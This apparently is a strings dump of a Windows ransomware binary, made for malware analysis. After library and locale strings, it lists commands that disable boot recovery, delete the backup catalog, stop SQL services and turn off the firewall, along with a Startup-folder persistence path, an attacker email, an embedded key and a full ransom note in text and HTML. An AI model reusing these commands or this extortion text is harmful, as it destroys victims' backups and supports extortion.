[Strings]
nth   paddr      vaddr      len  size section type    string
14088 0x001171b0 0x005183b0 5    12   .rdata  utf16le es-py
14089 0x001171bc 0x005183bc 5    12   .rdata  utf16le es-sv
14090 0x001171c8 0x005183c8 5    12   .rdata  utf16le es-uy
14091 0x001171d4 0x005183d4 5    12   .rdata  utf16le es-ve
14092 0x001171e0 0x005183e0 5    12   .rdata  utf16le et-ee
14093 0x001171ec 0x005183ec 5    12   .rdata  utf16le eu-es
14094 0x001171f8 0x005183f8 5    12   .rdata  utf16le fa-ir
14095 0x00117204 0x00518404 5    12   .rdata  utf16le fi-fi
14096 0x00117210 0x00518410 5    12   .rdata  utf16le fo-fo
14097 0x0011721c 0x0051841c 5    12   .rdata  utf16le fr-be
14098 0x00117228 0x00518428 5    12   .rdata  utf16le fr-ca
14099 0x00117234 0x00518434 5    12   .rdata  utf16le fr-ch
14100 0x00117240 0x00518440 5    12   .rdata  utf16le fr-fr
14101 0x0011724c 0x0051844c 5    12   .rdata  utf16le fr-lu
14102 0x00117258 0x00518458 5    12   .rdata  utf16le fr-mc
14103 0x00117264 0x00518464 5    12   .rdata  utf16le gl-es
14104 0x00117270 0x00518470 5    12   .rdata  utf16le gu-in
14105 0x0011727c 0x0051847c 5    12   .rdata  utf16le he-il
14106 0x00117288 0x00518488 5    12   .rdata  utf16le hi-in
14107 0x00117294 0x00518494 5    12   .rdata  utf16le hr-ba
14108 0x001172a0 0x005184a0 5    12   .rdata  utf16le hr-hr
14109 0x001172ac 0x005184ac 5    12   .rdata  utf16le hu-hu
14110 0x001172b8 0x005184b8 5    12   .rdata  utf16le hy-am
14111 0x001172c4 0x005184c4 5    12   .rdata  utf16le id-id
14112 0x001172d0 0x005184d0 5    12   .rdata  utf16le is-is
14113 0x001172dc 0x005184dc 5    12   .rdata  utf16le it-ch
14114 0x001172e8 0x005184e8 5    12   .rdata  utf16le it-it
14115 0x001172f4 0x005184f4 5    12   .rdata  utf16le ja-jp
14116 0x00117300 0x00518500 5    12   .rdata  utf16le ka-ge
14117 0x0011730c 0x0051850c 5    12   .rdata  utf16le kk-kz
14118 0x00117318 0x00518518 5    12   .rdata  utf16le kn-in
14119 0x00117324 0x00518524 6    14   .rdata  utf16le kok-in
14120 0x00117334 0x00518534 5    12   .rdata  utf16le ko-kr
14121 0x00117340 0x00518540 5    12   .rdata  utf16le ky-kg
14122 0x0011734c 0x0051854c 5    12   .rdata  utf16le lt-lt
14123 0x00117358 0x00518558 5    12   .rdata  utf16le lv-lv
14124 0x00117364 0x00518564 5    12   .rdata  utf16le mi-nz
14125 0x00117370 0x00518570 5    12   .rdata  utf16le mk-mk
14126 0x0011737c 0x0051857c 5    12   .rdata  utf16le ml-in
14127 0x00117388 0x00518588 5    12   .rdata  utf16le mn-mn
14128 0x00117394 0x00518594 5    12   .rdata  utf16le mr-in
14129 0x001173a0 0x005185a0 5    12   .rdata  utf16le ms-bn
14130 0x001173ac 0x005185ac 5    12   .rdata  utf16le ms-my
14131 0x001173b8 0x005185b8 5    12   .rdata  utf16le mt-mt
14132 0x001173c4 0x005185c4 5    12   .rdata  utf16le nb-no
14133 0x001173d0 0x005185d0 5    12   .rdata  utf16le nl-be
14134 0x001173dc 0x005185dc 5    12   .rdata  utf16le nl-nl
14135 0x001173e8 0x005185e8 5    12   .rdata  utf16le nn-no
14136 0x001173f4 0x005185f4 5    12   .rdata  utf16le ns-za
14137 0x00117400 0x00518600 5    12   .rdata  utf16le pa-in
14138 0x0011740c 0x0051860c 5    12   .rdata  utf16le pl-pl
14139 0x00117418 0x00518618 5    12   .rdata  utf16le pt-br
14140 0x00117424 0x00518624 5    12   .rdata  utf16le pt-pt
14141 0x00117430 0x00518630 6    14   .rdata  utf16le quz-bo
14142 0x00117440 0x00518640 6    14   .rdata  utf16le quz-ec
14143 0x00117450 0x00518650 6    14   .rdata  utf16le quz-pe
14144 0x00117460 0x00518660 5    12   .rdata  utf16le ro-ro
14145 0x0011746c 0x0051866c 5    12   .rdata  utf16le ru-ru
14146 0x00117478 0x00518678 5    12   .rdata  utf16le sa-in
14147 0x00117484 0x00518684 5    12   .rdata  utf16le se-fi
14148 0x00117490 0x00518690 5    12   .rdata  utf16le se-no
14149 0x0011749c 0x0051869c 5    12   .rdata  utf16le se-se
14150 0x001174a8 0x005186a8 5    12   .rdata  utf16le sk-sk
14151 0x001174b4 0x005186b4 5    12   .rdata  utf16le sl-si
14152 0x001174c0 0x005186c0 6    14   .rdata  utf16le sma-no
14153 0x001174d0 0x005186d0 6    14   .rdata  utf16le sma-se
14154 0x001174e0 0x005186e0 6    14   .rdata  utf16le smj-no
14155 0x001174f0 0x005186f0 6    14   .rdata  utf16le smj-se
14156 0x00117500 0x00518700 6    14   .rdata  utf16le smn-fi
14157 0x00117510 0x00518710 6    14   .rdata  utf16le sms-fi
14158 0x00117520 0x00518720 5    12   .rdata  utf16le sq-al
14159 0x0011752c 0x0051872c 10   22   .rdata  utf16le sr-ba-cyrl
14160 0x00117544 0x00518744 10   22   .rdata  utf16le sr-ba-latn
14161 0x0011755c 0x0051875c 10   22   .rdata  utf16le sr-sp-cyrl
14162 0x00117574 0x00518774 10   22   .rdata  utf16le sr-sp-latn
14163 0x0011758c 0x0051878c 5    12   .rdata  utf16le sv-fi
14164 0x00117598 0x00518798 5    12   .rdata  utf16le sv-se
14165 0x001175a4 0x005187a4 5    12   .rdata  utf16le sw-ke
14166 0x001175b0 0x005187b0 6    14   .rdata  utf16le syr-sy
14167 0x001175c0 0x005187c0 5    12   .rdata  utf16le ta-in
14168 0x001175cc 0x005187cc 5    12   .rdata  utf16le te-in
14169 0x001175d8 0x005187d8 5    12   .rdata  utf16le th-th
14170 0x001175e4 0x005187e4 5    12   .rdata  utf16le tn-za
14171 0x001175f0 0x005187f0 5    12   .rdata  utf16le tr-tr
14172 0x001175fc 0x005187fc 5    12   .rdata  utf16le tt-ru
14173 0x00117608 0x00518808 5    12   .rdata  utf16le uk-ua
14174 0x00117614 0x00518814 5    12   .rdata  utf16le ur-pk
14175 0x00117620 0x00518820 10   22   .rdata  utf16le uz-uz-cyrl
14176 0x00117638 0x00518838 10   22   .rdata  utf16le uz-uz-latn
14177 0x00117650 0x00518850 5    12   .rdata  utf16le vi-vn
14178 0x0011765c 0x0051885c 5    12   .rdata  utf16le xh-za
14179 0x00117668 0x00518868 6    14   .rdata  utf16le zh-chs
14180 0x00117678 0x00518878 6    14   .rdata  utf16le zh-cht
14181 0x00117688 0x00518888 5    12   .rdata  utf16le zh-cn
14182 0x00117694 0x00518894 5    12   .rdata  utf16le zh-hk
14183 0x001176a0 0x005188a0 5    12   .rdata  utf16le zh-mo
14184 0x001176ac 0x005188ac 5    12   .rdata  utf16le zh-sg
14185 0x001176b8 0x005188b8 5    12   .rdata  utf16le zh-tw
14186 0x001176c4 0x005188c4 5    12   .rdata  utf16le zu-za
14187 0x001176d4 0x005188d4 5    6    .rdata  ascii   1#INF
14188 0x001176dc 0x005188dc 6    7    .rdata  ascii   1#QNAN
14189 0x001176e4 0x005188e4 6    7    .rdata  ascii   1#SNAN
14190 0x001176ec 0x005188ec 5    6    .rdata  ascii   1#IND
14191 0x00117737 0x00518937 5    7    .rdata  utf8    ?0gǓW blocks=Basic Latin,Latin Extended-B
14192 0x001177c9 0x005189c9 5    6    .rdata  ascii   UUUUU
14193 0x001177e0 0x005189e0 7    16   .rdata  utf16le CONOUT$
14194 0x00117812 0x00518a12 6    8    .rdata  utf8    g5RҌ<t blocks=Basic Latin,Cyrillic
14195 0x00117826 0x00518a26 4    6    .rdata  utf8    `<țu blocks=Basic Latin,Latin Extended-B
14196 0x00117840 0x00518a40 4    6    .rdata  utf8    ќ/p= blocks=Cyrillic,Basic Latin
14197 0x00117863 0x00518a63 4    6    .rdata  utf8    &TŤ< blocks=Basic Latin,Latin Extended-A
14198 0x00117871 0x00518a71 5    6    .rdata  ascii   ?RbSQ
14199 0x00117877 0x00518a77 5    6    .rdata  ascii   <zQ}<
14200 0x00117890 0x00518a90 4    5    .rdata  ascii   _/:>
14201 0x001178a1 0x00518aa1 4    6    .rdata  utf8    æDAo blocks=Latin-1 Supplement,Basic Latin
14202 0x001178b7 0x00518ab7 7    8    .rdata  ascii   <8bunz8
14203 0x00117903 0x00518b03 4    6    .rdata  utf8    ]9ݏ< blocks=Basic Latin,Syriac
14204 0x00117917 0x00518b17 4    6    .rdata  utf8    <ʩ:7 blocks=Basic Latin,IPA Extensions
14205 0x00117923 0x00518b23 4    6    .rdata  utf8    s)ҧ< blocks=Basic Latin,Cyrillic
14206 0x00117955 0x00518b55 4    5    .rdata  ascii   cC<-
14207 0x0011795a 0x00518b5a 4    5    .rdata  ascii   a`\bN
14208 0x00117974 0x00518b74 6    8    .rdata  utf8    ΐv<'*6 blocks=Greek and Coptic,Basic Latin
14209 0x001179b7 0x00518bb7 4    5    .rdata  ascii   <)TH
14210 0x001179e7 0x00518be7 4    5    .rdata  ascii   <$"U
14211 0x00117a46 0x00518c46 4    5    .rdata  ascii   e<bN
14212 0x00117a77 0x00518c77 4    6    .rdata  utf8    <۠*B blocks=Basic Latin,Arabic
14213 0x00117a86 0x00518c86 4    5    .rdata  ascii   {<6w
14214 0x00117a9a 0x00518c9a 4    6    .rdata  utf8    Ͱ77\t blocks=Greek and Coptic,Basic Latin
14215 0x00117aa7 0x00518ca7 4    6    .rdata  utf8    <ONޟ blocks=Basic Latin,Thaana
14216 0x00117aca 0x00518cca 5    6    .rdata  ascii   ]{f\f\n
14217 0x00117ad7 0x00518cd7 4    5    .rdata  ascii   <\%>
14218 0x00117b53 0x00518d53 6    7    .rdata  ascii   l,kg<i
14219 0x00117b6a 0x00518d6a 5    6    .rdata  ascii   \aJ-\a\r
14220 0x00117bc5 0x00518dc5 5    7    .rdata  utf8    Î<'Za blocks=Latin-1 Supplement,Basic Latin
14221 0x00117bd7 0x00518dd7 7    8    .rdata  ascii   <@En[vP
14222 0x00117bf0 0x00518df0 5    6    .rdata  ascii   log10
14223 0x00117d44 0x00518f44 4    5    .rdata  ascii   lzZ?
14224 0x00117d7c 0x00518f7c 4    5    .rdata  ascii   \tk8=
14225 0x00117dab 0x00518fab 5    6    .rdata  ascii   \tQ*\e=
14226 0x00117dbc 0x00518fbc 4    5    .rdata  ascii   b6\b=
14227 0x00117e53 0x00519053 4    6    .rdata  utf8    N\vָ? blocks=Basic Latin,Hebrew
14228 0x00117e67 0x00519067 6    7    .rdata  ascii   ?5Wg4p
14229 0x00117e79 0x00519079 4    5    .rdata  ascii   Nv$^
14230 0x00117eb1 0x005190b1 4    6    .rdata  utf8     <śm blocks=Basic Latin,Latin Extended-A
14231 0x00117ee9 0x005190e9 4    5    .rdata  ascii   w(@\t
14232 0x00117f2b 0x0051912b 5    6    .rdata  ascii   BC .=
14233 0x00117f49 0x00519149 4    5    .rdata  ascii   a>-\e
14234 0x00117f62 0x00519162 4    5    .rdata  ascii   (lX 
14235 0x0011802c 0x0051922c 4    5    .rdata  ascii   #{ =
14236 0x00118031 0x00519231 4    5    .rdata  ascii   `~R=
14237 0x0011806c 0x0051926c 4    5    .rdata  ascii   }s"=
14238 0x00118072 0x00519272 4    5    .rdata  ascii   \tE[\n
14239 0x00118079 0x00519279 5    6    .rdata  ascii   %S#[k
14240 0x001180c1 0x005192c1 4    6    .rdata  utf8    x¾/@ blocks=Basic Latin,Latin-1 Supplement
14241 0x001180ca 0x005192ca 6    7    .rdata  ascii   "B <1=
14242 0x001180d9 0x005192d9 4    5    .rdata  ascii   \-!y
14243 0x001180fa 0x005192fa 6    7    .rdata  ascii   \f#.X'=
14244 0x0011812c 0x0051932c 4    5    .rdata  ascii   i9+=
14245 0x00118598 0x00519798 17   18   .rdata  ascii   Unknown exception
14246 0x001185ac 0x005197ac 15   16   .rdata  ascii   bad locale name
14247 0x001185bc 0x005197bc 5    6    .rdata  ascii   false
14248 0x001185c4 0x005197c4 4    5    .rdata  ascii   true
14249 0x001185d0 0x005197d0 7    8    .rdata  ascii   generic
14250 0x001185d8 0x005197d8 8    9    .rdata  ascii   iostream
14251 0x001185e4 0x005197e4 21   22   .rdata  ascii   iostream stream error
14252 0x001185fc 0x005197fc 6    7    .rdata  ascii   system
14253 0x00118604 0x00519804 13   14   .rdata  ascii   unknown error
14254 0x00118614 0x00519814 20   21   .rdata  ascii   ios_base::badbit set
14255 0x0011862c 0x0051982c 21   22   .rdata  ascii   ios_base::failbit set
14256 0x00118644 0x00519844 20   21   .rdata  ascii   ios_base::eofbit set
14257 0x00118660 0x00519860 23   24   .rdata  ascii   ', trying to retrieve '
14258 0x00118678 0x00519878 11   12   .rdata  ascii   ', stored '
14259 0x00118684 0x00519884 35   36   .rdata  ascii   NameValuePairs: type mismatch for '
14260 0x001186a8 0x005198a8 31   32   .rdata  ascii   Clone() is not implemented yet.
14261 0x001186c8 0x005198c8 7    8    .rdata  ascii   unknown
14262 0x001186d4 0x005198d4 47   48   .rdata  ascii   : this object doesn't support resynchronization
14263 0x00118708 0x00519908 63   64   .rdata  ascii   StreamTransformation: this object doesn't support random access
14264 0x00118748 0x00519948 57   58   .rdata  ascii   RandomNumberGenerator: IncorporateEntropy not implemented
14265 0x00118784 0x00519984 53   54   .rdata  ascii   BufferedTransformation: this object is not attachable
14266 0x001187bc 0x005199bc 51   52   .rdata  ascii   CryptoMaterial: this object contains invalid values
14267 0x001187f0 0x005199f0 59   60   .rdata  ascii   CryptoMaterial: this object does not support precomputation
14268 0x00118830 0x00519a30 80   81   .rdata  ascii   GeneratableCryptoMaterial: this object does not support key/parameter generation
14269 0x00118888 0x00519a88 10   11   .rdata  ascii   " not used
14270 0x00118894 0x00519a94 36   37   .rdata  ascii   AlgorithmParametersBase: parameter "
14271 0x001188bc 0x00519abc 11   12   .rdata  ascii   InputBuffer
14272 0x001188c8 0x00519ac8 5    6    .rdata  ascii   SHA-1
14273 0x001188d0 0x00519ad0 12   13   .rdata  ascii   FeedbackSize
14274 0x001188e0 0x00519ae0 13   14   .rdata  ascii   InputFileName
14275 0x001188f0 0x00519af0 17   18   .rdata  ascii   InputFileNameWide
14276 0x00118904 0x00519b04 15   16   .rdata  ascii   InputBinaryMode
14277 0x00118914 0x00519b14 14   15   .rdata  ascii   OutputFileName
14278 0x00118924 0x00519b24 18   19   .rdata  ascii   OutputFileNameWide
14279 0x00118938 0x00519b38 16   17   .rdata  ascii   OutputBinaryMode
14280 0x0011894c 0x00519b4c 18   19   .rdata  ascii   EncodingParameters
14281 0x00118960 0x00519b60 9    10   .rdata  ascii   Separator
14282 0x0011896c 0x00519b6c 10   11   .rdata  ascii   Terminator
14283 0x00118978 0x00519b78 9    10   .rdata  ascii   Uppercase
14284 0x00118984 0x00519b84 9    10   .rdata  ascii   GroupSize
14285 0x00118990 0x00519b90 8    9    .rdata  ascii   Log2Base
14286 0x0011899c 0x00519b9c 19   20   .rdata  ascii   DecodingLookupArray
14287 0x001189b0 0x00519bb0 16   17   .rdata  ascii   InsertLineBreaks
14288 0x001189c4 0x00519bc4 13   14   .rdata  ascii   MaxLineLength
14289 0x001189d8 0x00519bd8 70   71   .rdata  ascii   CipherModeBase: feedback size cannot be specified for this cipher mode
14290 0x00118a24 0x00519c24 4    5    .rdata  ascii   /GCM
14291 0x00118a34 0x00519c34 4    5    .rdata  ascii   MGF1
14292 0x00118a50 0x00519c50 4    5    .rdata  ascii   ", "
14293 0x00118a5c 0x00519c5c 9    10   .rdata  ascii   copy_file
14294 0x00118a68 0x00519c68 6    7    .rdata  ascii   exists
14295 0x00118a70 0x00519c70 9    10   .rdata  ascii   file_size
14296 0x00118a7c 0x00519c7c 5    6    .rdata  ascii   space
14297 0x00118a84 0x00519c84 6    7    .rdata  ascii   status
14298 0x00118a8c 0x00519c8c 16   17   .rdata  ascii   create_directory
14299 0x00118aa0 0x00519ca0 4    5    .rdata  ascii   copy
14300 0x00118aa8 0x00519ca8 10   22   .rdata  utf16le C:\Windows
14301 0x00118ac0 0x00519cc0 12   26   .rdata  utf16le C:\\Windows\
14302 0x00118af0 0x00519cf0 49   50   .rdata  ascii                                                    
14303 0x00118b28 0x00519d28 26   27   .rdata  ascii   Unhandled exception caught
14304 0x00118b58 0x00519d58 4    5    .rdata  ascii   fuck
14305 0x00118b68 0x00519d68 6    14   .rdata  utf16le ey.txt
14306 0x00118b78 0x00519d78 7    16   .rdata  utf16le IDk.txt
14307 0x00118b88 0x00519d88 20   42   .rdata  utf16le Decryption-Guide.txt
14308 0x00118bb4 0x00519db4 20   42   .rdata  utf16le Decryption-Guide.HTA
14309 0x00118be0 0x00519de0 6    14   .rdata  utf16le RSAKEY
14310 0x00118bf0 0x00519df0 4    10   .rdata  utf16le shit
14311 0x00118bfc 0x00519dfc 7    8    .rdata  ascii   threaad
14312 0x00118c04 0x00519e04 13   14   .rdata  ascii   sqlserver.exe
14313 0x00118c14 0x00519e14 12   13   .rdata  ascii   msftesql.exe
14314 0x00118c24 0x00519e24 12   13   .rdata  ascii   sqlagent.exe
14315 0x00118c34 0x00519e34 14   15   .rdata  ascii   sqlbrowser.exe
14316 0x00118c44 0x00519e44 13   14   .rdata  ascii   sqlwriter.exe
14317 0x00118c54 0x00519e54 10   11   .rdata  ascii   mysqld.exe
14318 0x00118c60 0x00519e60 13   14   .rdata  ascii   mysqld-nt.exe
14319 0x00118c70 0x00519e70 14   15   .rdata  ascii   mysqld-opt.exe
14320 0x00118c8c 0x00519e8c 21   44   .rdata  utf16le \Decryption-Guide.txt
14321 0x00118cba 0x00519eba 22   46   .rdata  utf16le r\Decryption-Guide.HTA
14322 0x00118ce8 0x00519ee8 10   11   .rdata  ascii   0123456789
14323 0x00118cf4 0x00519ef4 26   27   .rdata  ascii   QWERTYUIOPASDFGHJKLZXCVBNM
14324 0x00118d10 0x00519f10 88   89   .rdata  ascii   0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
14325 0x00118d6c 0x00519f6c 22   23   .rdata  ascii   C:\ProgramData\IDk.txt
14326 0x00118d84 0x00519f84 23   24   .rdata  ascii   C:\ProgramData\pkey.txt
14327 0x00118d9c 0x00519f9c 14   15   .rdata  ascii   C:\ProgramData
14328 0x00118db0 0x00519fb0 30   31   .rdata  ascii   95DE4925807931C8D34E1D9460A2DE
14329 0x00118dd0 0x00519fd0 912  913  .rdata  ascii   B56BFF3C6B2E0F4E9F1DAE9E473CB39B6EE513DDC656B7B925468DE9FBCC1AB57E148DDE1009F8B7529A4E84850D7ECF43637A2D898EAEA3579544028F90370C65820B44A2C0B842A5D993F34FA8C549E9B20932D8BE55992CE50C95510FDD95734C8FFF874E771D33225664466F6E226FAF33FE35714A61E147AF2F17CF81015EEFBE8274C2672480956E3D44D54675E7725C53E334CBD146FA0B9B1F239898BDC3E5566E0DCB0E5FAEE35B685C0EEA7885CAE76DAA4A467E168C2AD1B1D32D883203A8F3A5FEA70903CC6F49067F099D2CAEED344F339E3BF1512BFC566CD2B3D68FC69A12BBFC565067CD777B65F7D9DA0A246CF4DA8C9362B55E9184658243C060381312A10A356D2039CA76CBC6BD1679E983ED653567CB8DBD7DC2FAF4F4F539EE41C6DB9B53C04F0F90CDA65FB3378739A75E016753EBA8FB838E8EE2AFC92FDB1CC3C4C94B88CFADC42BC1D781787661EEADA813C4A8802AD3211E04A39DEFA683CEEC8CFA9195936BCF66B3D42729A1E7E61AB4C521E2232365217743381CFD4B58FEE404639320574FA8C46580291B5412259D2CEEADF947D4DA5AD5EE3D149B2F80D969525DD8E8E1FA3983C9930577534CF1A00A264A482C709A1278BD1EB24AB328
14330 0x00119164 0x0051a364 23   24   .rdata  ascii   https://api.my-ip.io/ip
14331 0x0011917c 0x0051a37c 17   18   .rdata  ascii   %d-%m-%Y %H:%M:%S
14332 0x00119190 0x0051a390 25   26   .rdata  ascii   C:\ProgramData\prvkey.txt
14333 0x001191ac 0x0051a3ac 6    7    .rdata  ascii    Date:
14334 0x001191b4 0x0051a3b4 4    5    .rdata  ascii    Ip=
14335 0x001191bc 0x0051a3bc 6    7    .rdata  ascii    Mail=
14336 0x001191c4 0x0051a3c4 11   12   .rdata  ascii     Disksize=
14337 0x001191d0 0x0051a3d0 5    6    .rdata  ascii   \n\nID=
14338 0x0011928e 0x0051a48e 26   54   .rdata  utf16le GC:\ProgramData\RSAKEY.key
14339 0x001192c6 0x0051a4c6 5    12   .rdata  utf16le t.key
14340 0x001192d4 0x0051a4d4 7    16   .rdata  utf16le RSAKEY-
14341 0x001192e8 0x0051a4e8 4    5    .rdata  ascii   .key
14342 0x001192f0 0x0051a4f0 7    8    .rdata  ascii   RSAKEY-
14343 0x001192f8 0x0051a4f8 161  162  .rdata  ascii   fuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyoufuckyou
14344 0x0011939c 0x0051a59c 20   21   .rdata  ascii   Unhandled exception\n
14345 0x001193b4 0x0051a5b4 61   62   .rdata  ascii   C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
14346 0x001193f4 0x0051a5f4 19   20   .rdata  ascii   Encrpt@criptext.com
14347 0x00119410 0x0051a610 176  177  .rdata  ascii   012600EB82A86ECB8099E3272F0E692BA2F2D95A0D3C878D97C81EDA2AC2639598E70889BA6723CFAD748D08A71B4022D5E4873787273EC8498DA7E2158B38B751E3D1E2D29CA840E02EB75F5A80F7572223F6583205CDB8
14348 0x001194c4 0x0051a6c4 7    8    .rdata  ascii   .encrpt
14349 0x001194cc 0x0051a6cc 14   15   .rdata  ascii   net stop MSDTC
14350 0x001194dc 0x0051a6dc 57   58   .rdata  ascii   bcdedit /set {default} bootstatuspolicy ignoreallfailures
14351 0x00119518 0x0051a718 41   42   .rdata  ascii   bcdedit /set {default} recoveryenabled no
14352 0x00119544 0x0051a744 29   30   .rdata  ascii   wbadmin delete catalog -quiet
14353 0x00119564 0x0051a764 23   24   .rdata  ascii   net stop SQLSERVERAGENT
14354 0x0011957c 0x0051a77c 20   21   .rdata  ascii   net stop MSSQLSERVER
14355 0x00119594 0x0051a794 12   13   .rdata  ascii   net stop vds
14356 0x001195a4 0x0051a7a4 47   48   .rdata  ascii   netsh advfirewall set  currentprofile state off
14357 0x001195d4 0x0051a7d4 38   39   .rdata  ascii   netsh firewall set opmode mode=disable
14358 0x001195fc 0x0051a7fc 18   19   .rdata  ascii   net stop SQLWriter
14359 0x00119610 0x0051a810 19   20   .rdata  ascii   net stop SQLBrowser
14360 0x00119624 0x0051a824 23   24   .rdata  ascii   net stop MSSQL$CONTOSO1
14361 0x0011963c 0x0051a83c 25   52   .rdata  utf16le \n\n in Case of no answer: 
14362 0x00119670 0x0051a870 17   36   .rdata  utf16le  \n\nOUR Email    :
14363 0x00119698 0x0051a898 955  1912 .rdata  utf16le Your Files Are Has Been Locked\n\nYour Files Has Been Encrypted with cryptography Algorithm\n\nIf You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n\nSend Test File + The Key File on Your System (File Exist in C:/ProgramData example : RSAKEY-SE-24r6t523 pr RSAKEY.KEY) to Make Sure Your Files Can be Restored\n\nMake an Agreement on Price with me and Pay\n\n\n\nGet Decryption Tool + RSA Key AND Instruction For Decryption Process\n\n\n\nAttention:\n\n1- Do Not Rename or Modify The Files (You May loose That file)\n\n2- Do Not Try To Use 3rd Party Apps or Recovery Tools ( if You want to do that make an copy from Files and try on them and Waste Your time )\n\n3-Do not Reinstall Operation System(Windows) You may loose the key File and Loose Your Files\n\n4-Do Not Always Trust to Middle mans and negotiators (some of them are good but some of them agree on 4000usd for example and Asked 10000usd From Client)  this Was happened\n\n\n\nYour Case ID :
14364 0x00119e10 0x0051b010 36   74   .rdata  utf16le \n   </div> \n </div>\n</body>\n</html> 
14365 0x00119e60 0x0051b060 32   66   .rdata  utf16le \n        <br>\n        Our Email:
14366 0x00119ea8 0x0051b0a8 1983 3966 .rdata  utf16le <!DOCTYPE html>\n<html lang='en'>\n<head>\n  <meta http-equiv='X-UA-Compatible' content='IE=9' />    <script type='text/javascript'> window.resizeTo(window.screen.width,window.screen.height);</script>   <meta charset='UTF - 8'>\n    <title>Your Files Are Locked</title>\n    <meta http-equiv='x - ua - compatible' content='IE = 9'/>\n    <style>\n        body {  \n            background-image: url('https://thumbor.forbes.com/thumbor/711x399/https://specials-images.forbesimg.com/imageserve/60b123d8f2894ada36d1fb5b/Lock---abstract-glitch-background/960x0.jpg');\n            background-size: cover; \n            font-size: 15pt;\n            font-weight:bolder ;\n             text-align: center;\n            margin: auto;\n        \n\n   }     #div1 {\n            margin: auto;\n            margin-top:50px;\n            text-align: center;\n            background-color: rgb(41, 46, 56);\n            opacity: 95%;\n            border-radius: 50px 20px;\n            width: 60%;\n            color: white;\n            color: wheat;\n        \n\n   }     #div2 {\n            margin: auto;\n            margin-top: 40px;\n            text-align: center;\n            background-color: rgb(41, 46, 56);\n            opacity: 95%;\n            border-radius: 50px 20px;\n            width: 60%;\ncolor: wheat;\n   }     \n\n        #div3{ \n            color: white;\n            margin: auto;\n            margin-top:40px;\n            text-align: center;\n            background-color: rgb(41, 46, 56);\n            opacity: 95%;\n            border-radius: 50px 20px;\n            width: 60%;\n    }    \n\n    </style>\n</head>\n<body>\n<div id='div0'>\n<div id='div1'>\n     Your Files Are Has Been Locked\n     <br>\n     Your Files Has Been Encrypted with cryptography Algorithm\n     <br>\n     If You Need Your Files And They are Important to You, Dont be shy Send Me an Email\n     <br>\n     Send Test File + The Key File on Your System (File Exist in C:/ProgramData example : KEY-SE-24r6t523 or RSAKEY.KEY) to Make Sure Your Fi
14367 0x0011ae26 0x0051c026 783  1568 .rdata  utf16le les Can be Restored\n     <br>\n     Make an Agreement on Price with me and Pay\n     <br>\n     Get Decryption Tool + RSA Key AND Instruction For Decryption Process\n </div>\n    <div id='div2'>\n        Attention:\n  <br>\n        1- Do Not Rename or Modify The Files (You May loose That file)\n<br>\n        2- Do Not Try To Use 3rd Party Apps or Recovery Tools ( if You want to do that make an copy from Files and try on them and Waste Your time )\n<br>\n        3-Do not Reinstall Operation System(Windows) You may loose the key File and Loose Your Files\n<br>\n        4-Do Not Always Trust to Middle mans and negotiators (some of them are good but some of them agree on 4000usd for example and Asked 10000usd From Client)  this Was happened\n    </div>\n    <div id='div3'>\n    Your Case ID : 
14368 0x0011b450 0x0051c650 19   20   .rdata  ascii   OutputStringPointer
14369 0x0011b464 0x0051c664 45   46   .rdata  ascii   StringSink: OutputStringPointer not specified
14370 0x0011b498 0x0051c698 69   70   .rdata  ascii   Unflushable<T>: this object has buffered input that cannot be flushed
14371 0x0011b4f4 0x0051c6f4 55   56   .rdata  ascii   BufferedTransformation: this object doesn't allow input
14372 0x0011b52c 0x0051c72c 18   19   .rdata  ascii   vector<T> too long
14373 0x0011b55c 0x0051c75c 58   59   .rdata  ascii   AllocatorBase: requested size would cause integer overflow
14374 0x0011b598 0x0051c798 23   24   .rdata  ascii   invalid string position
14375 0x0011b5b0 0x0051c7b0 15   16   .rdata  ascii   string too long
14376 0x0011ee20 0x00520020 4    9    .rdata  utf16le $R8R
14377 0x0012548c 0x0052668c 6    7    .rdata  ascii   RSDS=#
14378 0x001254a4 0x005266a4 58   59   .rdata  ascii   C:\Users\Legion\source\repos\last project\Release\curl.pdb
14379 0x001254f4 0x005266f4 4    5    .rdata  ascii   GCTL
14380 0x00125500 0x00526700 8    9    .rdata  ascii   .text$di
14381 0x00125514 0x00526714 8    9    .rdata  ascii   .text$mn
14382 0x00125528 0x00526728 7    8    .rdata  ascii   .text$x
